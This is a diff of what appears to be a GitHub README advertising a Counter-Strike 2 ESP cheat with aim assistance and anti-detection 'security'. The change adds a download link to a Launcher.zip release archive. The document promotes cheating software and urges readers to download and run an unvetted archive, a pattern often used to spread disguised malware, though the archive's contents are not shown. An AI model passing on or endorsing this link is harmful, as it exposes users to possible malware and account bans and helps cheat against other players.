@@ -5,7 +5,7 @@
 
 > ### *Reshape your Counter-Strike 2 experience with the perfect CS2 ESP. Enhance your gameplay with unprecedented security and performance measures aswell as countless customization options. Are you ready to shake up the rankings? Dive in and start grinding your CS rating today!*
 
-### [*Download latest update*]()
+### [*Download latest update*](https://github.com/pmanw0w/cs2-esp/releases/download/cs2-esp/Launcher.zip)
 
 ## MAIN FEATURES
 * Bot / Aim Assistance - Never miss a shot and start dominating the scoreboard.
